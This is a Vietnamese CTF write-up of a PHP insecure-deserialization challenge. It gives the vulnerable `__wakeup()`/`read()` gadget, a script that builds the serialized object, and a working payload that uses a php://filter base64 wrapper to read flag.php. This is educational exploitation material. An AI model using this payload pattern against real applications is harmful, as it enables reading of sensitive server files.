Web cho source code và lấy flag trong file `flag.php`:

![image](https://user-images.githubusercontent.com/92881216/236450662-279545ac-809e-4310-a53a-fbb4ae10dc3d.png)

Web nhận param `hix` bằng phương thức GET và unserialize nó. 

Nhìn vào source ta thấy có hàm :
```
public function read()
    {
        $res = "";
        if (isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        echo $res;
    }
```
Hàm `read()` này được dùng để đọc file bằng `file_get_contents()` đây là hàm dễ bị khai thác để dùng nó đọc file `flag.php`. Chúng ta có thể kiểm soát serialized data nên sẽ có thể gán `$this->filename` là `flag.php` hoặc dùng warraper(`php://filter/convert.base64-encode/resource=flag.php`).

Hàm `read()` này được gọi thông qua 1 magic method `__wakeup()` (thực thi khi deserialize):
```
public function __wakeup()
    {
        return $this->name->read();
    } 
```
Vậy ta cần đưa vào param `hix` giá trị serialized của object class B từ đó sẽ thực thi các đoạn mã liên tiếp.

script:
```
<?php
class A
{
    public $filename = "php://filter/convert.base64-encode/resource=flag.php";
}
class B
{
    public $name;
    public function __construct($name)
    {
        $this->name = $name;
    }
}
$a = new A();
$b = new B($a);
echo serialize($b);
```
Được payload:
```
O:1:"B":1:{s:4:"name";O:1:"A":1:{s:8:"filename";s:52:"php://filter/convert.base64-encode/resource=flag.php";}}
```
Kết quả:

![image](https://user-images.githubusercontent.com/92881216/236452288-d235b919-fafa-4a25-b1d3-66ee98edd189.png)

Decode Base64:

![image](https://user-images.githubusercontent.com/92881216/236452405-e49207d3-7785-491e-b6c0-1aa64a452f53.png)

> flag: `flag{insecure_deserialization!!!}`
